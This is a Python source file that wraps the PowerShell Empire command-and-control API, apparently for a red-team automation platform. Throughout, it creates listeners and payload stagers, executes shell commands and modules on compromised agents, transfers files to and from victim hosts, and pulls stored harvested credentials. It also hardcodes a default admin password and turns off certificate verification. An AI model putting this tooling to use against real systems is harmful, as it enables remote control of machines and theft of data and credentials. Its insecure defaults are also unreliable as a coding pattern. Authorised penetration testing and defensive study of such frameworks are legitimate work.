import zlib
import json
import copy
import base64
import shutil
import os.path
import pathlib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class call_powershell_empire:

    def __init__(self):
        self.args = None
        self.host_info = None
        self.server_uri = 'https://localhost:1337/'
        self.results = None
        self.__token = None

    def set_args(self, args, public_ip, hostname, local_ip):
        self.args = args
        self.host_info = [public_ip, hostname] + local_ip
        return True

    @property
    def token(self):
        request_payload = {'username': 'empireadmin', 'password': 'password123'}
        if not self.__token:
            token_response = requests.post(f'{self.server_uri}api/admin/login', json=request_payload, verify=False)
            if token_response.status_code == 200:
                self.__token = token_response.json()['token']
        return self.__token

    def get_listeners(self):
        if 'Name' in self.args:
            listener_name = self.args['Name']
            get_listeners_uri = f'{self.server_uri}api/listeners/{listener_name}?token={self.token}'
            get_listeners_response = requests.get(get_listeners_uri, verify=False)
            if get_listeners_response.status_code == 200:
                listeners = get_listeners_response.json()['listeners']
                output = {'outcome': 'success', 'get_listeners': listeners, 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': get_listeners_response.json(), 'forward_log': 'False'}
        else:
            get_listeners_uri = f'{self.server_uri}api/listeners?token={self.token}'
            get_listeners_response = requests.get(get_listeners_uri, verify=False)
            listeners = get_listeners_response.json()['listeners']
            output = {'outcome': 'success', 'get_listeners': listeners, 'forward_log': 'False'}
        return output

    def get_listener_options(self):
        if 'listener_type' in self.args:
            listener_type = self.args['listener_type']
            get_listener_options_uri = f'{self.server_uri}api/listeners/options/{listener_type}?token={self.token}'
            get_listener_options_response = requests.get(get_listener_options_uri, verify=False)
            if get_listener_options_response.status_code == 200:
                listener_options = get_listener_options_response.json()['listeneroptions']
                output = {'outcome': 'success', 'get_listener_options': listener_options, 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': 'Check listener_type', 'forward_log': 'False'}
        else:
            output = {'outcome': 'failed', 'message': 'Missing listener_type', 'forward_log': 'False'}
        return output

    def create_listener(self):
        if 'listener_type' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing listener_type', 'forward_log': 'False'}
            return output
        if 'Name' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        listener_type = self.args['listener_type']
        listener_name = self.args['Name']
        listener_args = copy.deepcopy(self.args)
        if 'Host' in listener_args:
            if 'https://' in listener_args['Host'].lower() and 'CertPath' not in listener_args:
                listener_args['CertPath'] = '/opt/Empire/empire/server/data'
        del listener_args['listener_type']
        create_listener_uri = f'{self.server_uri}api/listeners/{listener_type}?token={self.token}'
        create_listener_response = requests.post(create_listener_uri, json=listener_args, verify=False)
        if create_listener_response.status_code == 200:
            get_listener_uri = f'{self.server_uri}api/listeners/{listener_name}?token={self.token}'
            get_listener_response = requests.get(get_listener_uri, verify=False)
            listener = get_listener_response.json()['listeners'][0]
            output = {'outcome': 'success', 'create_listener': listener, 'forward_log': 'True'}
        else:
            message = create_listener_response.json()
            output = {'outcome': 'failed', 'message': message, 'forward_log': 'False'}
        return output

    def kill_listener(self):
        if 'Name' in self.args:
            listener_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        kill_listener_uri = f'{self.server_uri}api/listeners/{listener_name}?token={self.token}'
        kill_listener_response = requests.delete(kill_listener_uri, verify=False)
        if kill_listener_response.status_code == 200:
            output = {'outcome': 'success', 'kill_listener': kill_listener_response.json(), 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': kill_listener_response.json(), 'forward_log': 'False'}
        return output

    def kill_all_listeners(self):
        kill_listener_uri = f'{self.server_uri}api/listeners/all?token={self.token}'
        kill_all_listeners_response = requests.delete(kill_listener_uri, verify=False)
        output = {'outcome': 'success', 'kill_all_listeners': kill_all_listeners_response.json(), 'forward_log': 'True'}
        return output

    def get_stagers(self):
        if 'StagerName' in self.args:
            stager_name = self.args['StagerName']
            get_stagers_uri = f'{self.server_uri}api/stagers/{stager_name}?token={self.token}'
            get_stagers_response = requests.get(get_stagers_uri, verify=False)
            if get_stagers_response.status_code == 200:
                stagers = get_stagers_response.json()['stagers']
                output = {'outcome': 'success', 'get_stagers': stagers, 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': get_stagers_response.json(), 'forward_log': 'False'}
        else:
            get_stagers_uri = f'{self.server_uri}api/stagers?token={self.token}'
            get_stagers_response = requests.get(get_stagers_uri, verify=False)
            stagers = get_stagers_response.json()['stagers']
            output = {'outcome': 'success', 'get_stagers': stagers, 'forward_log': 'False'}
        return output

    def create_stager(self):
        if 'Listener' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing Listener', 'forward_log': 'False'}
            return output
        if 'StagerName' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing StagerName', 'forward_log': 'False'}
            return output
        stager_name = self.args['StagerName']
        create_stager_uri = f'{self.server_uri}api/stagers?token={self.token}'
        create_stager_response = requests.post(create_stager_uri, json=self.args, verify=False)
        if create_stager_response.status_code == 200:
            stager = {}
            stager_details = create_stager_response.json()[stager_name]
            for k, v in stager_details.items():
                if 'Value' in v:
                    stager[k] = v['Value']
                else:
                    stager[k] = v
            if 'OutFile' in self.args and 'Output' in stager_details:
                file_name = self.args['OutFile']
                output = stager_details['Output']
                decoded_output = base64.b64decode(output)
                path = pathlib.Path('/opt/havoc/shared', file_name)
                with open(path, 'wb+') as f:
                    f.write(decoded_output)
            elif 'BinaryFile' in self.args:
                try:
                    out_file = pathlib.Path(self.args['BinaryFile']).name
                    stager['OutFile'] = out_file
                except Exception as e:
                    output = {'outcome': 'failed', 'message': f'create_stager failed with error: {e}', 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': 'instruct_args must contain one of OutFile or BinaryFile', 'forward_log': 'False'}
            output = {'outcome': 'success', 'create_stager': stager, 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': create_stager_response.json(), 'forward_log': 'False'}
        return output

    def list_empire_agents(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
            list_empire_agents_uri = f'{self.server_uri}api/agents/{agent_name}?token={self.token}'
            list_empire_agents_response = requests.get(list_empire_agents_uri, verify=False)
            if list_empire_agents_response.status_code == 200:
                agents = list_empire_agents_response.json()['agents']
                output = {'outcome': 'success', 'list_empire_agents': agents, 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': list_empire_agents_response.json(), 'forward_log': 'False'}
        else:
            list_empire_agents_uri = f'{self.server_uri}api/agents?token={self.token}'
            list_empire_agents_response = requests.get(list_empire_agents_uri, verify=False)
            agents = list_empire_agents_response.json()['agents']
            output = {'outcome': 'success', 'list_empire_agents': agents, 'forward_log': 'False'}
        return output

    def list_stale_empire_agents(self):
        list_stale_empire_agents_uri = f'{self.server_uri}api/agents/stale?token={self.token}'
        list_stale_empire_agents_response = requests.get(list_stale_empire_agents_uri, verify=False)
        stale_agents = list_stale_empire_agents_response.json()['agents']
        output = {'outcome': 'success', 'list_stale_empire_agents': stale_agents, 'forward_log': 'False'}
        return output

    def remove_empire_agent(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        remove_empire_agent_uri = f'{self.server_uri}api/agents/{agent_name}?token={self.token}'
        remove_empire_agent_response = requests.delete(remove_empire_agent_uri, verify=False)
        if remove_empire_agent_response.status_code == 200:
            output = {'outcome': 'success', 'remove_empire_agent': remove_empire_agent_response.json(), 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': remove_empire_agent_response.json(), 'forward_log': 'False'}
        return output

    def remove_stale_empire_agents(self):
        remove_stale_empire_agents_uri = f'{self.server_uri}api/agents/stale?token={self.token}'
        remove_stale_empire_agents_response = requests.delete(remove_stale_empire_agents_uri, verify=False)
        output = {'outcome': 'success', 'remove_stale_empire_agents': remove_stale_empire_agents_response.json(), 'forward_log': 'True'}
        return output

    def execute_empire_agent_shell_command(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        if 'command' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing command', 'forward_log': 'False'}
            return output
        shell_command_args = copy.deepcopy(self.args)
        del shell_command_args['Name']
        agent_shell_uri = f'{self.server_uri}api/agents/{agent_name}/shell?token={self.token}'
        agent_shell_response = requests.post(agent_shell_uri, json=shell_command_args, verify=False)
        if agent_shell_response.status_code == 200:
            output = {'outcome': 'success', 'execute_empire_agent_shell_command': agent_shell_response.json(), 'forward_log': 'True'}
            return output
        else:
            output = {'outcome': 'failed', 'message': agent_shell_response.json(), 'forward_log': 'False'}
            return output

    def get_empire_agent_results(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        if 'task_id' in self.args:
            try:
                task_id = int(self.args['task_id'])
            except:
                output = {'outcome': 'failed', 'message': 'task_id must be a digit', 'forward_log': 'False'}
                return output    
        else:
            output = {'outcome': 'failed', 'message': 'Missing task_id', 'forward_log': 'False'}
            return output
        agent_results_uri = f'{self.server_uri}api/agents/{agent_name}/results?token={self.token}'
        agent_results_response = requests.get(agent_results_uri, verify=False)
        if agent_results_response.status_code == 200:
            results = None
            tmp_results = agent_results_response.json()['results'][0]['AgentResults']
            for tmp_result in tmp_results:
                if 'taskID' in tmp_result and tmp_result['taskID'] == task_id:
                    results = base64.b64encode(zlib.compress(json.dumps(tmp_result).encode())).decode()
            output = {'outcome': 'success', 'get_empire_agent_results': results, 'forward_log': 'True'}
            return output
        else:
            output = {'outcome': 'failed', 'message': agent_results_response.json(), 'forward_log': 'False'}
            return output
    
    def list_empire_agent_task_ids(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        agent_results_uri = f'{self.server_uri}api/agents/{agent_name}/results?token={self.token}'
        agent_results_response = requests.get(agent_results_uri, verify=False)
        if agent_results_response.status_code == 200:
            task_id_list = []
            tmp_results = agent_results_response.json()['results'][0]['AgentResults']
            for tmp_result in tmp_results:
                if 'taskID' in tmp_result:
                    task_id_list.append(tmp_result['taskID'])
            output = {'outcome': 'success', 'list_empire_agent_task_ids': task_id_list, 'forward_log': 'False'}
            return output
        else:
            output = {'outcome': 'failed', 'message': agent_results_response.json(), 'forward_log': 'False'}
            return output

    def rename_empire_agent(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        if 'Newname' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing Newname', 'forward_log': 'False'}
            return output
        rename_args = copy.deepcopy(self.args)
        del rename_args['Name']
        rename_empire_agent_uri = f'{self.server_uri}api/agents/{agent_name}/rename?token={self.token}'
        rename_empire_agent_response = requests.post(rename_empire_agent_uri, json=rename_args, verify=False)
        if rename_empire_agent_response.status_code == 200:
            output = {'outcome': 'success', 'rename_empire_agent': rename_empire_agent_response.json(), 'forward_log': 'True'}
            return output
        else:
            output = {'outcome': 'failed', 'message': rename_empire_agent_response.json(), 'forward_log': 'False'}
            return output

    def kill_empire_agent(self):
        if 'Name' in self.args:
            agent_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        kill_empire_agent_uri = f'{self.server_uri}api/agents/{agent_name}/kill?token={self.token}'
        kill_empire_agent_response = requests.get(kill_empire_agent_uri, verify=False)
        if kill_empire_agent_response.status_code == 200:
            output = {'outcome': 'success', 'kill_empire_agent': kill_empire_agent_response.json(), 'forward_log': 'True'}
            return output
        else:
            output = {'outcome': 'failed', 'message': kill_empire_agent_response.json(), 'forward_log': 'False'}
            return output

    def kill_all_empire_agents(self):
        kill_all_empire_agents_uri = f'{self.server_uri}api/agents/all/kill?token={self.token}'
        kill_all_empire_agents_response = requests.get(kill_all_empire_agents_uri, verify=False)
        output = {'outcome': 'success', 'kill_all_empire_agents': kill_all_empire_agents_response.json(), 'forward_log': 'True'}
        return output

    def list_empire_modules(self):
        if 'Name' in self.args:
            module_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        list_empire_modules_uri = f'{self.server_uri}api/modules/{module_name}?token={self.token}'
        list_empire_modules_response = requests.get(list_empire_modules_uri, verify=False)
        if list_empire_modules_response.status_code == 200:
            modules = list_empire_modules_response.json()['modules']
            output = {'outcome': 'success', 'list_empire_modules': modules, 'forward_log': 'False'}
        else:
            output = {'outcome': 'failed', 'message': list_empire_modules_response.json(), 'forward_log': 'False'}
        return output

    def search_empire_modules(self):
        if 'term' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing term', 'forward_log': 'False'}
            return output
        search_empire_modules_uri = f'{self.server_uri}api/modules/search?token={self.token}'
        search_empire_modules_response = requests.post(search_empire_modules_uri, json=self.args, verify=False)
        if 'modules' in search_empire_modules_response.json():
            modules = search_empire_modules_response.json()['modules']
            output = {'outcome': 'success', 'search_empire_modules': modules, 'forward_log': 'False'}
            return output
        else:
            output = {'outcome': 'success', 'search_empire_modules': 'No modules found', 'forward_log': 'False'}
            return output

    def execute_empire_agent_module(self):
        if 'Agent' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing Agent', 'forward_log': 'False'}
            return output
        if 'Name' in self.args:
            module_name = self.args['Name']
        else:
            output = {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
            return output
        module_args = copy.deepcopy(self.args)
        del module_args['Name']
        execute_module_uri = f'{self.server_uri}api/modules/{module_name}?token={self.token}'
        execute_module_response = requests.post(execute_module_uri, json=module_args, verify=False)
        if execute_module_response.status_code == 200:
            output = {'outcome': 'success', 'execute_empire_agent_module': execute_module_response.json(), 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': execute_module_response.json(), 'forward_log': 'False'}
        return output
    
    def download_file_from_empire_agent(self):
        if 'Name' not in self.args:
            return {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
        agent_name = self.args['Name']
        if 'file_name' not in self.args:
            return {'outcome': 'failed', 'message': 'Missing file_name', 'forward_log': 'False'}
        file_name = self.args['file_name']
        download_file_from_empire_agent_uri = f'{self.server_uri}api/agents/{agent_name}/download?token={self.token}'
        download_file_from_empire_agent_response = requests.post(download_file_from_empire_agent_uri, json={'filename': file_name}, verify=False)
        if download_file_from_empire_agent_response.status_code == 200:
            output = {'outcome': 'success', 'download_file_from_empire_agent': download_file_from_empire_agent_response.json(), 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': download_file_from_empire_agent_response.json(), 'forward_log': 'False'}
        return output
    
    def upload_file_to_empire_agent(self):
        if 'Name' not in self.args:
            return {'outcome': 'failed', 'message': 'Missing Name', 'forward_log': 'False'}
        agent_name = self.args['Name']
        if 'file_name' not in self.args:
            return {'outcome': 'failed', 'message': 'Missing file_name', 'forward_log': 'False'}
        file_name = self.args['file_name']
        file_path = pathlib.Path('/opt/havoc/shared', file_name)
        if os.path.isfile(file_path):
            with open(file_path, 'r') as f:
                raw_file = f.read()
        else:
            return {'outcome': 'failed', 'message': f'File {file_name} not found', 'forward_log': 'False'}
        encoded_file = base64.b64encode(raw_file)
        upload_file_to_empire_agent_uri = f'{self.server_uri}api/agents/{agent_name}/upload?token={self.token}'
        upload_file_to_empire_agent_response = requests.post(upload_file_to_empire_agent_uri, json={'filename': file_name, 'data': encoded_file}, verify=False)
        if upload_file_to_empire_agent_response.status_code == 200:
            output = {'outcome': 'success', 'upload_file_to_empire_agent': upload_file_to_empire_agent_response.json(), 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': upload_file_to_empire_agent_response.json(), 'forward_log': 'False'}
        return output

    def sync_downloads(self):
        file_list = []
        for root, subdirs, files in os.walk('/opt/empire/server/downloads'):
            for filename in files:
                file_list.append(filename)
                src_file_path = str(f'{root}/{filename}')
                dst_file_path = str(f'/opt/havoc/shared/{filename}')
                shutil.copy(src_file_path, dst_file_path)
        output = {'outcome': 'success', 'sync_downloads': file_list, 'forward_log': 'True'}
        return output

    def get_stored_credentials(self):
        get_stored_creds_uri = f'{self.server_uri}api/creds?token={self.token}'
        get_stored_creds_response = requests.get(get_stored_creds_uri, verify=False)
        stored_creds = get_stored_creds_response.json()['creds']
        output = {'outcome': 'success', 'get_stored_credentials': stored_creds, 'forward_log': 'True'}
        return output

    def get_logged_events(self):
        if 'event_type' in self.args:
            event_type = self.args['event_type']
            get_logged_events_uri = f'{self.server_uri}api/reporting/type/{event_type}?token={self.token}'
            get_logged_events_response = requests.get(get_logged_events_uri, verify=False)
            if get_logged_events_response.status_code == 200:
                events = get_logged_events_response.json()['reporting']
                output = {'outcome': 'success', 'get_logged_events': events, 'forward_log': 'False'}
            else:
                output = {'outcome': 'failed', 'message': 'Check event_type', 'forward_log': 'False'}
        else:
            get_logged_events_uri = f'{self.server_uri}api/reporting?token={self.token}'
            get_logged_events_response = requests.get(get_logged_events_uri, verify=False)
            events = get_logged_events_response.json()['reporting']
            output = {'outcome': 'success', 'get_logged_events': events, 'forward_log': 'False'}
        return output

    def cert_gen(self):
        if 'cert_type' not in self.args:
            output = {'outcome': 'failed', 'message': 'Missing cert_type', 'forward_log': 'False'}
            return output
        cert_type = self.args['cert_type']
        if cert_type == 'self-signed':
            required_params = ['cert_country', 'cert_state', 'cert_locale', 'cert_org', 'cert_org_unit', 'cert_host']
            for param in required_params:
                if param not in self.args:
                    output = {'outcome': 'failed', 'message': f'Missing {param}', 'forward_log': 'False'}
                    return output
            cert_country = self.args['cert_country']
            cert_state = self.args['cert_state']
            cert_locale = self.args['cert_locale']
            cert_org = self.args['cert_org']
            cert_org_unit = self.args['cert_org_unit']
            cert_host = self.args['cert_host']
            if cert_host == 'public_ip':
                host = self.host_info[0]
            elif cert_host == 'local_ip':
                host = self.host_info[2]
            else:
                host = self.args['cert_host']
            subj = f'/C={cert_country}/ST={cert_state}/L={cert_locale}/O={cert_org}/OU={cert_org_unit}/CN={host}'
            p = subprocess.Popen(
                [
                    '/usr/bin/openssl',
                    'req',
                    '-new',
                    '-x509',
                    '-keyout',
                    '/opt/Empire/empire/server/data/empire-priv.key',
                    '-out',
                    '/opt/Empire/empire/server/data/empire-chain.pem',
                    '-days',
                    '365',
                    '-nodes',
                    '-subj',
                    f'{subj}'
                ],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            openssl_out = p.communicate()
            openssl_message = openssl_out[1].decode('utf-8')
            if 'problems making Certificate Request' not in openssl_message:
                output = {'outcome': 'success', 'cert_gen': {'host': host, 'subj': subj}, 'forward_log': 'True'}
            else:
                output = {'outcome': 'failed', 'message': openssl_message, 'forward_log': 'False'}
            return output
        if cert_type == 'ca-signed':
            if 'domain' not in self.args:
                output = {'outcome': 'failed', 'message': 'Missing domain for certificate registration', 'forward_log': 'False'}
                return output
            if 'email' not in self.args:
                output = {'outcome': 'failed', 'message': 'Missing email for certificate registration', 'forward_log': 'False'}
                return output
            domain = self.args['domain'].lower()
            email = self.args['email']
            if 'test_cert' in self.args and self.args['test_cert'].lower() == 'true':
                certbot_command = ['/usr/bin/certbot', 'certonly', '--standalone', '--non-interactive', '--agree-tos', '--test-cert', '-d', domain, '-m', email]
            else:
                certbot_command = ['/usr/bin/certbot', 'certonly', '--standalone', '--non-interactive', '--agree-tos', '-d', domain, '-m', email]
            p = subprocess.Popen(
                certbot_command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            certbot_out = p.communicate()
            certbot_message = certbot_out[0].decode('utf-8')
            if 'Successfully received certificate' not in certbot_message:
                output = {'outcome': 'failed', 'message': certbot_message, 'forward_log': 'False'}
                return output
            try:
                shutil.copyfile(
                    f'/etc/letsencrypt/live/{domain}/fullchain.pem', '/opt/Empire/empire/server/data/empire-chain.pem'
                )
            except Exception as e:
                output = {'outcome': 'failed', 'message': e, 'forward_log': 'False'}
                return output
            try:
                shutil.copyfile(
                    f'/etc/letsencrypt/live/{domain}/privkey.pem', '/opt/Empire/empire/server/data/empire-priv.key'
                )
            except Exception as e:
                output = {'outcome': 'failed', 'message': e, 'forward_log': 'False'}
                return output
            output = {'outcome': 'success', 'cert_gen': {'domain': domain, 'email': email}, 'forward_log': 'True'}
            return output
        output = {'outcome': 'failed', 'message': 'cert_type must be self-signed or ca-signed', 'forward_log': 'False'}
        return output

    def agent_status_monitor(self):
        current_agents = self.args['current_agents']
        agent_status_monitor_uri = f'{self.server_uri}api/agents?token={self.token}'
        agent_status_monitor_response = requests.get(agent_status_monitor_uri, verify=False)
        agents_status_dict = agent_status_monitor_response.json()
        new_agents = []
        dead_agents = []
        if 'agents' in agents_status_dict:
            agents_status = agents_status_dict['agents']
            current_agents_id = []
            for current in current_agents:
                current_agents_id.append(current['ID'])
            temp_agents_id = []
            for agent in agents_status:
                temp_agents_id.append(agent['ID'])
            for agent in agents_status:
                if agent['ID'] not in current_agents_id:
                    new_agents.append(agent)
            for current in current_agents:
                if current['ID'] not in temp_agents_id:
                    dead_agents.append(current)
        agents = {'new_agents': new_agents, 'dead_agents': dead_agents}
        return agents

    def echo(self):
        match = {
            'foo': 'bar',
            'bar': 'baz',
            'ping': 'pong',
            'and then': 'no more and then',
            'pen testing is dead': 'long live pen testing',
            'never gonna give you up': 'never gonna let you down, never gonna run around and desert you',
            'never gonna make you cry': 'never gonna say goodbye, never gonna tell a lie and hurt you'
        }

        if 'echo' in self.args:
            echo = self.args['echo']
            if echo in match:
                output = {'outcome': 'success', 'echo': match[echo], 'forward_log': 'False'}
            else:
                output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}
        else:
            output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}

        return output


class PowershellEmpireParser:

    def __init__(self, event, agent_status_monitor=False):
        self.event = event
        self.agent_status_monitor = agent_status_monitor

    def powershell_empire_parser(self):
        # If the event comes from the agent_status_monitor method, it will need to be converted to look like the
        # agent_shell_command and execute_module events.
        if self.agent_status_monitor:
            new_event = {'agent_info': {}}
            for k, v in self.event.items():
                new_event['agent_info'][k] = v
            self.event = new_event
        if 'agent_info' in self.event:
            agent_info = self.event['agent_info']
            if 'external_ip' in agent_info:
                self.event['target_ip'] = agent_info['external_ip']
            if 'internal_ip' in agent_info:
                self.event['target_internal_ip'] = agent_info['internal_ip']
            #if 'listener' in agent_info:
            #    listener = agent_info['listener']
            #    match_listener = re.search('https?:\/\/([^:]+):?(\d+)?\/?', listener)
            #    match_ip = re.search('\d+\.\d+\.\d+\.\d+', match_listener.group(1))
            #    if match_ip:
            #        self.event['callback_ip'] = match_listener.group(1)
            #    else:
            #        self.event['callback_hostname'] = match_listener.group(1)
            #    if match_listener.group(2):
            #        self.event['callback_port'] = match_listener.group(2)
        return self.event